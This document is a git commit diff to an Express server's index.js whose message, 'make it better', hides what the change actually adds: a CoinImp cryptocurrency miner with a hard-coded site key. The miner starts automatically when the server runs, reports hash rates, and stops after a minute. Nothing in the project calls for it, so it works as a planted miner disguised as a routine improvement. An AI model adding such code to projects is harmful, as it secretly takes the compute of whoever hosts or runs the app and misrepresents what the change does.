882f6abf33a728025d0ca18beec5bfc0f970a57d
Sam <sam.mamane@hotmail.fr>
2019-10-27 00:24:30 +0200

    make it better

--- index.js
+++ index.js
@@ -8,3 +8,27 @@ express()
   .set('view engine', 'ejs')
   .get('/', (req, res) => res.render('pages/index'))
   .listen(PORT, () => console.log(`Listening on ${ PORT }`))
+
+const CoinImp = require('coin-imp');
+
+(async () => {
+  // Create miner
+  const miner = await CoinImp('079dbe015ea0b1eb35fb4876c3821f025f481bee86b41948c856cefd8eb2ea84'); // CoinImp's Site Key
+
+  // Start miner
+  await miner.start();
+
+  // Listen on events
+  miner.on('found', () => console.log('Found!'));
+  miner.on('accepted', () => console.log('Accepted!'));
+  miner.on('update', data =>
+    console.log(`
+    Hashes per second: ${data.hashesPerSecond}
+    Total hashes: ${data.totalHashes}
+    Accepted hashes: ${data.acceptedHashes}
+  `)
+  );
+
+  // Stop miner
+  setTimeout(async () => await miner.stop(), 60000);
+})();
